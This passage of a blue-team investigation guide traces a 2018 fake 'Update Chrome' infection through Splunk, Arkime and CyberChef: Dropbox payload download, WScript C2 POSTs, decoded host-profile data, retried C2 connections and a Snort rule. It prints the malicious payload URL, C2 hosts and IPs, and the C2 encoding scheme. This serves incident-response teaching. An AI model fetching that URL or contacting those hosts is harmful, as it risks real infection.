'https://www.dropbox.com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1'
```

`copy(getUrl('…'))` puts the result on the clipboard. Typical errors: `Unexpected end of input` (missing `}`), `getUrl is not defined` (function not pasted, or a case typo), `Invalid or unexpected token` (a line break inside the string from Arkime's wrapping, or curly quotes).

**[data] Reading the URL:**

| Part | Meaning |
|---|---|
| `www.dropbox.com/s/fvl9rd86cmdilns/` | A Dropbox **shared link** uploaded by the attacker |
| `Chrome_72.3.22.js` | A **JavaScript** file, not an installer (`.exe`). Double-clicked on Windows it runs in **Windows Script Host (`wscript.exe`)** with the user's rights, outside the browser's sandbox |
| `?dl=1` | Download straight away instead of preview |

Chrome **72** did not exist in June 2018 (the PC runs 67). Dropbox is trusted and HTTPS — filters let it through and the content is invisible in the PCAP.

!!! question "Question: why did Dropbox suddenly appear before the URL was decoded?"
    It should not have. The right order is **decode the URL → see the domain → search for that domain**. The guide named Dropbox early because the PCAP had been analysed before. What the analyst's own data showed by then: Dropbox in 2-2 at 20:27:59–20:28:00, and `setTimeout(…, 3000)` on a page that loaded at 20:27:57. Timing alone is an **inference**; the decoded URL is the **evidence**.

!!! question "Question: who could work this out without help?"
    Nobody decodes from scratch. Three habits make it routine: (1) obfuscated text always travels **with its decoder** — find the function around the text and read it; (2) map each command to a CyberChef operation (`%2` → pick characters, `reverse` → Reverse, `atob` → From Base64, `^` → XOR); (3) when the function is simple and safe, **run it** in an offline console. And if it still does not decode, the network alone (fake page → 3 s → Dropbox) is enough for the ticket; write "URL obfuscated, not decoded".

**Ticket entry:**

```text
[2122 261124, Sung] – Reviewing content of fake page from lw2e.sineadhollywoodnutt.com in Arkime and decoding its download URL – Found – Further Analysis Required
```

### 3-5. Did the download happen? (Splunk) { #download }

HTTPS means no URL or file in `http.log`. Use the **SNI** — the server name sent in clear before encryption starts.

```spl
index=zeek sourcetype=zeek:ssl pcap_case=20180630_SORTING_THROUGH_THE_ALERTS server_name="*dropbox*"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t id_resp_h id_resp_p server_name version established
```

```text
t              id_resp_h     id_resp_p  server_name                                              version  established
20:28:01.640   162.125.9.6   443        uc7cfbc6f640f168ed8036c6d5bb.dl.dropboxusercontent.com   TLSv12   true
20:28:00.733   162.125.6.2   443        log.getdropbox.com                                       TLSv12   true
20:28:00.427   162.125.6.1   443        www.dropbox.com                                          TLSv12   true
```

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 id_resp_h=162.125.9.6
| eval t=strftime(ts,"%H:%M:%S")
| table t id_resp_h id_resp_p duration orig_bytes resp_bytes conn_state
```

```text
t         id_resp_h    id_resp_p  duration   orig_bytes  resp_bytes  conn_state
20:28:01  162.125.9.6  443        180.389    1237        23469       SF
```

**[data] Reading:**

- Fake page 20:27:57.029 + 3 s = **20:28:00.4** = the first Dropbox connection. The code and the traffic agree to **0.4 s**; the user did not need to click.
- `www.dropbox.com` → `log.getdropbox.com` (Dropbox's own page telemetry, normal) → `*.dl.dropboxusercontent.com` (the file server that serves `dl=1`).
- **~23 KB** received including TLS overhead → a file of roughly 20 KB or less, the size of a script. `SF` = transfer completed.
- **`duration` 180 s is not transfer time.** The browser keeps the connection open after a download (keep-alive) and closes it when idle.
- Content and hash are not visible — the host owner must collect `C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js` (location confirmed in 4-5).

Then **45 seconds with no network clue** (20:28:01 → 20:28:46) — about the time it takes to notice the download, click it and let Windows run it.

**Ticket entry:**

```text
[2213 261124, Sung] – Looking for download of Chrome_72.3.22.js from Dropbox by 172.16.2.169 – Found – Further Analysis Required
```

---

## Step 4 — The script runs: a WScript C2 { #wscript }

**Goal:** a downloaded file is not an infection until it runs. Find **proof of execution** and what it sent and received.

### 4-1. The three POSTs (Splunk) { #posts }

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS host="bb17eb22.login3.kimbrelelectric.com"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t uid id_orig_p id_resp_h method uri status_code user_agent request_body_len response_body_len resp_mime_types
```

- `uid` = Zeek's ID for **one TCP connection**; same `uid` = same connection. `request_body_len` = bytes the PC sent in the body, `response_body_len` = bytes returned.

```text
t              uid                 id_orig_p  id_resp_h      method  uri         status  request_body_len  response_body_len  resp_mime_types
20:28:47.389   CwVJZs2YKLpHSE8LQ1  49440      93.95.100.138  POST    /blank.gif  200     72                11866              text/plain
20:28:48.186   CwVJZs2YKLpHSE8LQ1  49440      93.95.100.138  POST    /blank.gif  200     2644              348868             text/plain
20:28:50.047   CwVJZs2YKLpHSE8LQ1  49440      93.95.100.138  POST    /blank.gif  200     256               0
```

**[data] Reading:**

- **One connection, three seconds, three POSTs** — a program following a script, not a person clicking.
- **POST to `/blank.gif`** — you download a GIF, you do not post data to one. Camouflage for anyone skimming logs.
- Rhythm: small (72) → large (2,644) → small (256) sent; medium (11.9 KB) → **very large (349 KB)** → nothing received. Something was **delivered**.

### 4-2. The DNS lookup just before { #c2-dns }

```spl
index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS query="*kimbrelelectric.com"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t id_resp_h query answers
```

```text
t              id_resp_h   query                                 answers
20:28:46.573   172.16.2.9  bb17eb22.login3.kimbrelelectric.com   93.95.100.138
```

0.8 s before the first POST. Same /24 as the fake page.

### 4-3. What came back (Splunk) { #c2-files }

Zeek treats every HTTP body as a file and hashes it.

```spl
index=zeek sourcetype=zeek:files pcap_case=20180630_SORTING_THROUGH_THE_ALERTS tx_hosts="93.95.100.138"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t tx_hosts rx_hosts mime_type seen_bytes md5
```

- `tx_hosts` = sender, `rx_hosts` = receiver, `mime_type` = type judged **from the content**.

```text
t              tx_hosts       rx_hosts      mime_type   seen_bytes  md5
20:28:48.503   93.95.100.138  172.16.2.169  text/plain  348868      dd83bbcc7dd4184b352f9882c3fe8408
20:28:47.666   93.95.100.138  172.16.2.169  text/plain  11866       0e8a4bb8758c4ca91a3ee52395617ef9
```

**[data] Reading:** both replies are `text/plain`, and in Arkime they are long runs of **`0-9a-f`** — **hex text**. Two characters per byte, so 349 KB of text = **~174 KB of data**. An EXE sent as hex text has no `MZ` and no `application/x-dosexec`, so an "EXE download" search misses it. **The MD5 is of the hex text**, not of any file on disk.

### 4-4. Request headers (Arkime) { #headers }

```text
tags == 20180630_SORTING_THROUGH_THE_ALERTS && host.http == bb17eb22.login3.kimbrelelectric.com
```

```text
POST /blank.gif HTTP/1.1
Accept: */*
Accept-Language: en-us
Age: 464b8967d47e14d7
Content-Type: application/x-www-form-urlencoded
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; ...)
Host: bb17eb22.login3.kimbrelelectric.com
Content-Length: 72
Connection: Keep-Alive
Cache-Control: no-cache

a=075d6d603e653c386b3969687b6c60686d6a7b6f606c686e6d6e646d686f6b646e6a7b
```

**[data] Reading:**

- **`Age:` does not belong in a request.** Caches put it in **replies**, and its value is seconds. Here the PC sends 16 hex characters, the same in every POST → **[inference]** a victim ID passed through a header.
- `UA-CPU: AMD64` is added by Windows' scripting HTTP objects on 64-bit systems. With `MSIE 7.0` → **a Windows script, not a browser**.
- `Content-Type: application/x-www-form-urlencoded` = form data, `name=value`. That is the key to decoding (next).

**Ticket entry:**

```text
[2224 261124, Sung] – Investigating HTTP POSTs from 172.16.2.169 to bb17eb22.login3.kimbrelelectric.com – Found – Further Analysis Required
```

### 4-5. Decoding the POST bodies (CyberChef) { #decode-posts }

No decoder function this time — it is inside the `.js` on the PC. So **read the shape**:

1. After `a=` only `0-9a-f`, even length → **hex**. From Hex → unreadable bytes → **another layer**.
2. The commonest simple layer is **1-byte XOR** — only 256 keys. Pick the right one with a **crib**: text that must be in the plain text. This is form data (`name=value&…`), and the outer names are single characters (`a=`, `b=`), so try **`&1=`**.

**Recipe** (each body separately; copy only the hex **after** `a=`, `b=`, `c=`):

1. **From Hex**
2. **XOR Brute Force** — Key length `1`, Crib `&1=`. Note the key on the readable row.
3. Replace it with **XOR** — that key, **HEX**.
4. **URL Decode** (`%5C` → `\`, `%3A` → `:`, `%7C` → `|`).

!!! note "Lengths"
    Zeek's `request_body_len` includes the two characters `a=`. The hex part is therefore **70** characters for `a=`, **2,642** for `b=` and **254** for `c=`. Check `ABC` under Input — `b=` is wrapped over many lines in Arkime and easy to cut short.

**`a=` — key `5d`**

```text
Z␀0=c8ae6d45&1=507&2=1530390526937&
```

The first one or two bytes are junk (probably key information) — ignore. `0=c8ae6d45` looks like an ID; `1=507` looks like a campaign/build number (it repeats in `b=` and `c=`); `2=` is **13 digits = epoch milliseconds**. CyberChef **From UNIX Timestamp** (Units: Milliseconds) or Splunk:

```spl
| makeresults
| eval t=strftime(1530390526937/1000, "%Y-%m-%d %H:%M:%S.%3N")
| table t
```

`| makeresults` creates one empty row to calculate on. Result **20:28:46.937 UTC** — the script's own clock, between the DNS lookup (46.573) and the POST (47.389). The message was built **at that moment, on that PC**.

**`b=` — key `db`, then URL Decode**

```text
0=507
1=C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js
2=AMD64
3=CONSERVATOR-PC
4=lloyd.maxwell
5=6
6=Windows_NT
7=FABULOUSDUKES
8=System manufacturer|
9=System Product Name|
10=031913 - 20130319;System Serial Number|
11=Windows Defender|
12=
13=90:E2:BA:2D:C6:D6|
14=Enhanced (101- or 102-key)|Enhanced (101- or 102-key)|
15=USB Input Device|
16=1024x768|
17=System Idle Process|System|smss.exe|...|explorer.exe|...|nvvsvc.exe|nvxdsync.exe|...|chrome.exe (x23)|wscript.exe|mscorsvw.exe|...|WmiPrvSE.exe|
18=2596
19=
20=1530390528027
```

| No. | Meaning |
|---|---|
| **1** | **Where the script ran: the Downloads folder.** The Dropbox file was **executed** — this confirms 3-5 |
| 3, 4, 7 | Host, user, **domain** — a company PC, a valuable target |
| 8–10 | Default BIOS strings (common on self-built PCs) |
| 11 | **Antivirus: Windows Defender only** |
| 13–16 | Network card, keyboard, mouse, screen — "is this a real person's PC?" |
| **17** | **Process list:** `wscript.exe` (the script engine — the identity of `MSIE 7.0`), 23 × `chrome.exe`, NVIDIA processes (matching the GPU in the TDS fingerprint), **no analysis tools** |
| 20 | 20:28:48.027 UTC, 0.16 s before the POST |

**[inference]** The attacker decides from this whether the PC is worth the next stage: domain-joined, real hardware, only the built-in AV. It passed — the **349 KB** reply came right after.

!!! question "Question: where is `c=`?"
    In the same Arkime session — the third POST. It did not show because Arkime displays the first **200 packets** by default, and this session has 299 + 296. `c=` comes **after** the 349 KB reply. Change **`200 packets`** to a larger value, switch **`Dst`** off to show only the PC's side, or Ctrl+F for `Content-Length: 256`. If something you expect is missing in Arkime, compare the session's packet count with the display limit first.

    How was `c=` known to exist? From the analyst's data: 4-1 shows a third POST with a **256-byte** body. That it is called `c=` was an inference from `a=`, `b=` — and from the earlier analysis of this PCAP, which should have been said.

**`c=` — key `c8`, then URL Decode**

```text
0=507&1=C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe&2=0&3=0&4=1&5=0&6=0&7=0&8=0&9=1530390529896&
```

- **[data]** An **`.exe`** with the same name, in the user's **`%TEMP%`**. `LLOYD~1.MAX` is the 8.3 short name of `lloyd.maxwell` (how `%TEMP%` is often expanded). `9=` = 20:28:49.896 UTC. `2=`–`8=` look like status flags — meaning unknown.
- **[inference]** The script decoded the 349 KB reply, saved it as `Chrome_72.3.22.exe`, ran it, and reported the path. Execution needs network proof → Step 5.

!!! question "Question: are there rules for which decoding to try when?"
    Yes — the character set says most of it. `0-9a-f`, even length → From Hex. `A-Z a-z 0-9 + /` with `=` at the end → From Base64. `%xx` → URL Decode (usually the **last** layer). `\x41` → Unescape string; `\u0041` → Unescape Unicode Characters; comma-separated decimals → From Charcode. Starts like `TVqQ` (Base64) / `4d5a` (hex) → an EXE; `H4sI` / `1f8b` → gzip. Unreadable bytes after a decode, low-to-medium Entropy → 1-byte XOR. **Crib** = text that must be there at **that** layer: `&1=` for form data, `http` for a URL, the host or user name found in baselining for a check-in, `This program` for an EXE. If XOR is followed by URL encoding, the crib for a path is `C%3A%5C`, not `C:\`.

**Ticket entry:**

```text
[2235 261124, Sung] – Decoding POST bodies to kimbrelelectric.com in CyberChef – Found
```

---

## Step 5 — After the payload: back to baseline candidates 1 and 2 { #followon }

**Why this step:** `c=` says an EXE was **saved**. Saved is not run. **[inference]** A newly run malware program almost always contacts **its own C2** first. So the question becomes: *what new external traffic starts after 20:28:50?* The answer was already in the notes — 2-2 showed no new suspicious domains after 20:28:46, and 2-3 showed exactly two no-DNS IPs. They were unexplained in baselining; now they can be tested against the new fact.

What the query looks for:

| Question | How |
|---|---|
| Did it start right after the EXE? | first `ts` vs `c=` (20:28:49.9) |
| Program or person? | `delta` — a fixed rhythm |
| Did any connection succeed? | `conn_state`, `history`, packet counts |

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_resp_h IN ("46.105.131.66","107.170.231.118")
| sort ts
| delta ts as gap
| eval t=strftime(ts,"%H:%M:%S.%3N"), gap=round(gap,1)
| table t id_orig_p id_resp_h id_resp_p conn_state history orig_pkts resp_pkts gap
```

- `sort ts` first — `delta` works in row order. `delta ts as gap` = seconds since the previous row.
- `history` = the TCP signals Zeek saw, **upper case from the PC, lower case from the server**: `S/s` SYN, `h` SYN-ACK, `R/r` RST, `D/d` data. `Sr` = "PC asked, server refused"; `S` = "PC asked, no answer".

```text
t              id_orig_p  id_resp_h         id_resp_p  conn_state  history  orig_pkts  resp_pkts  gap
20:29:00.525   49447      46.105.131.66     443        REJ         Sr       1          1
20:29:01.159   49447      46.105.131.66     443        REJ         Sr       1          1          0.6
20:29:01.795   49447      46.105.131.66     443        REJ         Sr       1          1          0.6
20:29:01.931   49448      46.105.131.66     443        REJ         Sr       1          1          0.1
20:29:02.560   49448      46.105.131.66     443        REJ         Sr       1          1          0.6
20:29:03.200   49448      46.105.131.66     443        REJ         Sr       1          1          0.6
20:31:14.351   49471      107.170.231.118   4143       S0          S        2          0          131.2
20:31:23.351   49471      107.170.231.118   4143       S0          S        1          0          9.0
20:31:35.352   49472      107.170.231.118   4143       S0          S        2          0          12.0
20:31:44.349   49472      107.170.231.118   4143       S0          S        1          0          9.0
20:36:10.366   49491      46.105.131.66     443        REJ         Sr       1          1          266.0
...            (same pattern)
20:59:06.815   49514      46.105.131.66     443        REJ         Sr       1          1          0.6
```

**[data] Reading:**

- **First attempt 20:29:00.525 — about 10 s after `c=`.**
- **46.105.131.66:443 — `Sr`, 1 packet each way.** The server is up but nothing listens on 443; it refuses. Windows retries a refused connection twice, 0.6 s apart, then tries again on a new port → **6 rows per round**. Zeek closes a connection on RST, so each retry is a new row: 6 × 5 rounds = the **30** in 2-3.
- **107.170.231.118:4143 — `S`, no reply at all.** Server down or packets dropped on the way. Windows re-sends the SYN with growing gaps (~3 s, ~6 s), gives up after ~9 s, tries a new port. Zeek splits each port into two rows after the idle gap → 4 rows × 4 rounds = **16**.
- Arkime shows the same: `SYN 1  SYN-ACK 0  RST 1`, Databytes 0.

**Rounds:**

| 46.105.131.66 | then, after ~2 min | 107.170.231.118 |
|---|---|---|
| 20:29:00 | → | 20:31:14 |
| 20:36:10 | → | 20:38:30 |
| 20:43:37 | → | 20:45:53 |
| 20:51:14 | → | 20:53:21 |
| 20:59:04 | (capture ends) | |

The two IPs **alternate**: IP 1 → ~2 min → IP 2 → ~5 min → repeat, a cycle of ~7.5 minutes until the capture ends. **[inference]** A program working through a built-in C2 list and sleeping between rounds.

**Conclusion:**

- **[data]** 10 s after the EXE report: two hard-coded IPs, fixed rhythm, **never connected**. No C2 commands, no further downloads, no exfiltration on the network.
- **[inference]** `%TEMP%\Chrome_72.3.22.exe` **ran** and tried its C2. Hard-coded IP:port C2 on 443 and odd high ports after a fake-update infection matches how **Dridex** behaved in 2018 — without a hash or signature the ticket says "consistent with Dridex (unconfirmed)".
- A dead C2 protects the PC only today. The host is infected: clean it, and treat the user's passwords as exposed.

**Ticket entries:**

```text
[1951 261124, Sung] – Looking for external connections by 172.16.2.169 without a DNS lookup – Found
[2329 261124, Sung] – Investigating repeated connection attempts from 172.16.2.169 to 46.105.131.66 and 107.170.231.118 after the payload download – Found
```

---

## Step 6 — One simple Snort rule { #snort }

| Candidate | For | Against |
|---|---|---|
| **C2 domain `kimbrelelectric.com`** | Confirmed post-execution traffic; plain HTTP | The domain can change |
| `/chromefiles/` | Catches the pre-infection stage | Other sites may use the name |
| The two C2 IPs | Catches the failed C2 | No content; IPs change easily |

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"SocGholish C2 kimbrelelectric.com - Sung"; content:"kimbrelelectric.com"; nocase; sid:1000041; rev:1;)
```

- `$HOME_NET any -> $EXTERNAL_NET 80` — inside to outside port 80. `content` + `nocase` — the text anywhere in the packet, any case (it is in each POST's `Host:` header). `sid` 1000000+ = own rules. The generated sub-domain (`bb17eb22.login3.`) is left out on purpose — it may change per victim.

Add the rule on **one line** to `\\10.50.10.60\rules\local.rules`, then on pcapbox:

```bash
sudo snort -T -c /etc/snort/snort.conf 2>&1 | tail -5
snort-test 20180630_SORTING_THROUGH_THE_ALERTS
```

```text
[1/2] 문법 OK
[2/2] /data/pcap/20180630_SORTING_THROUGH_THE_ALERTS.pcap
  개수 [gid:sid:rev] 메시지
      3 [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung
```

**3 alerts** = the three POSTs. The DNS lookup has the name too, but DNS is UDP and the rule is TCP.

!!! warning "`sudo pcap-ingest: command not found` — and do not re-ingest anyway"
    On Oracle Linux `sudo` only searches its `secure_path`, which does not include `/usr/local/bin`. Use the full path (`sudo /usr/local/bin/pcap-ingest …`) if you ever need it. But re-ingesting a case re-runs **Zeek and Arkime** too and can put every log into Splunk and Arkime **twice**, doubling the counts on this page. `snort-test` is enough to test a rule.

---

## Timeline (2018-06-30, UTC) { #timeline }

| Time | Event |
|---|---|
| 20:27:15 | Capture starts |
| 20:27:17–18 | CONSERVATOR-PC and **lloyd.maxwell** log on (Kerberos) |
| 20:27:52 | `www.cnn.com` opened (noise — ads follow) |
| 20:27:53 | `www.stmarybahrain[.]com` opened, no Referer — **hacked site** |
| 20:27:55–56 | `track.positiverefreshment[.]org/s_code.js` ×3 — fingerprint, TDS passes the PC |
| 20:27:57 | Fake **"Update Chrome"** page from `lw2e.sineadhollywoodnutt[.]com` |
| 20:28:00–01 | 3 s timer → Dropbox → `Chrome_72.3.22.js` (~20 KB, HTTPS) |
| 20:28:46 | DNS `bb17eb22.login3.kimbrelelectric[.]com` — **user ran the .js** |
| 20:28:47 | POST `a=` — check-in |
| 20:28:48 | POST `b=` — host profile; reply **349 KB** hex payload |
| 20:28:50 | POST `c=` — `%TEMP%\Chrome_72.3.22.exe` reported |
| 20:29:00 | First C2 attempt 46.105.131.66:443 (refused) |
| 20:31:14 | First C2 attempt 107.170.231.118:4143 (no answer) |
| 20:29–20:59 | Attempts alternate every ~7.5 min — never connect |
| 20:33–20:35 | Chrome component update via BITS (normal) |
| 20:59:06 | Capture ends |

---

## Incident ticket { #ticket }

Key findings only, short sentences, simple English; baselining and the MAC address are left out. Operator name, log times and ticket links are placeholders.

[:material-download: Download the ticket as a txt file](files/180630_CONSERVATOR-PC_ticket.txt){ .md-button }

```text
--8<-- "docs/blueteam/investigations/files/180630_CONSERVATOR-PC_ticket.txt"
```

---

## Copy-ready queries { #query-sheet }

Replace `<case>` with your case name.

**Splunk (Zeek)**

```spl
index=zeek sourcetype=zeek:conn | stats count by pcap_case
index=zeek pcap_case=<case> | stats count by sourcetype | sort - count
index=zeek sourcetype=zeek:conn pcap_case=<case> | stats min(ts) as first max(ts) as last count as sessions | eval duration_min=round((last-first)/60,1) | eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
index=zeek sourcetype=zeek:conn pcap_case=<case> | stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first max(ts) as last by id_orig_h | eval first=strftime(first,"%H:%M:%S"), last=strftime(last,"%H:%M:%S") | sort - sessions
index=zeek sourcetype=zeek:kerberos pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count values(request_type) as types values(success) as success values(error_msg) as errors by client | sort first
index=zeek sourcetype=zeek:ntlm pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | table t id_orig_h id_resp_h id_resp_p username hostname domainname server_nb_computer_name success
index=zeek sourcetype=zeek:dns pcap_case=<case> qtype_name=SOA | eval t=strftime(ts,"%H:%M:%S") | table t id_orig_h id_resp_h query qtype_name rcode_name
index=zeek sourcetype=zeek:software pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | table t host software_type name unparsed_version
index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<pc> NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4 | stats count dc(id_resp_h) as ips values(service) as service values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by proto id_resp_p | sort - count
index=zeek sourcetype=zeek:dns pcap_case=<case> id_orig_h=<pc> NOT query="*<own domain>" | rex field=query "(?<domain>[^.]+\.[^.]+)$" | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count dc(query) as names values(query) as examples by domain | eval examples=mvindex(examples,0,2) | sort first
index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<pc> NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4 NOT [search index=zeek sourcetype=zeek:dns pcap_case=<case> | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h] | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first max(t) as last count values(id_resp_p) as ports values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by id_resp_h | sort first
index=zeek sourcetype=zeek:http pcap_case=<case> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | stats count min(t) as first values(method) as methods values(user_agent) as user_agents sum(response_body_len) as received by host | sort first
index=zeek sourcetype=zeek:http pcap_case=<case> host IN ("<h1>","<h2>") | eval t=strftime(ts,"%H:%M:%S.%3N") | search NOT uri="*.jpg*" NOT uri="*.png*" NOT uri="*.gif*" NOT uri="*.css*" | sort ts | table t host uri referrer status_code resp_mime_types response_body_len
index=zeek sourcetype=zeek:ssl pcap_case=<case> server_name="*<name>*" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t id_resp_h id_resp_p server_name version established
index=zeek sourcetype=zeek:http pcap_case=<case> host="<c2 host>" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t uid id_orig_p id_resp_h method uri status_code user_agent request_body_len response_body_len resp_mime_types
index=zeek sourcetype=zeek:files pcap_case=<case> tx_hosts="<server ip>" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t tx_hosts rx_hosts mime_type seen_bytes md5
index=zeek sourcetype=zeek:conn pcap_case=<case> id_resp_h IN ("<ip1>","<ip2>") | sort ts | delta ts as gap | eval t=strftime(ts,"%H:%M:%S.%3N"), gap=round(gap,1) | table t id_orig_p id_resp_h id_resp_p conn_state history orig_pkts resp_pkts gap
| makeresults | eval t=strftime(<epoch_ms>/1000, "%Y-%m-%d %H:%M:%S.%3N") | table t
```

**Arkime**

```text
tags == <case>
tags == <case> && host.http == lw2e.sineadhollywoodnutt.com && http.uri == *index.php*
tags == <case> && host.http == bb17eb22.login3.kimbrelelectric.com
tags == <case> && ip.dst == [46.105.131.66, 107.170.231.118]
```

**CyberChef**

```text
Hidden JS strings:   Find / Replace (Regex (.)(.) -> $2, Global)  ->  Reverse (Character)      [input without quotes]
C2 POST bodies:      From Hex  ->  XOR Brute Force (Key length 1, Crib &1=)  ->  XOR (Key <hex>)  ->  URL Decode
Epoch ms:            From UNIX Timestamp (Units: Milliseconds)
```

---

## Lessons { #lessons }

1. **Baselining notes pay off later.** Three unexplained lines (two silent IPs, one odd User-Agent) were the whole infection; each was explained only once later facts arrived.
2. **Busy browsing hides a short attack.** 184 destinations; the infection is a handful of hosts in one minute. Remove the known-good (CDN, ads, BITS, CryptoAPI, CNAME to ad platforms) and read what is left.
3. **No DNS + a fixed rhythm = a program.** The no-DNS subsearch reduced 184 destinations to the two C2 IPs.
4. **The Referer is the chain.** Every malicious request pointed back to the church page.
5. **A new User-Agent = a new program.** `MSIE 7.0` + `UA-CPU` 46 s after a download meant the file had run; `b=` proved it.
6. **Splunk for who/when/how much, Arkime for what exactly.** The download URL and the profile data were only in bodies.
7. **Decoders travel with the encoded text.** Read the function and translate it, or run it alone in an offline console. Without a decoder, read the shape: character set → layer → crib from the format.
8. **Check the input before blaming the recipe.** Quotes, a missing prefix or a cut-off wrap changed every result; `ABC` and Zeek's body length catch it.
9. **Know your tools' limits.** Multi-value `host` doubled counts; Arkime's 200-packet limit hid `c=`; re-ingesting would have doubled everything.
10. **Keep data and inference apart.** "Timing fits" is inference; "the decoded code says so" is evidence. The ticket gets evidence.

## References { #references }

- [Night Dew, second pass — pcapbox, Snort test guide](night-dew-arkime-splunk-netlogon-bruteforce.md) · [BEGUILESOFT — Splunk-first baselining](beguilesoft-hawkeye-ftp-exfil.md)
- [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md)
- [Zeek logs](../../network/zeek/index.md) · [conn.log](../../network/zeek/conn-log.md) · [files.log](../../network/zeek/files-log.md) · [ssl & x509](../../network/zeek/ssl-x509.md)
- [Beaconing & C2](../../network/beaconing-c2.md) · [Playbook: compromised workstation](../playbooks/compromised-workstation.md)
- Original exercise: [malware-traffic-analysis.net — 2018-06-30 Sorting through the alerts](https://malware-traffic-analysis.net/2018/06/30/index.html)
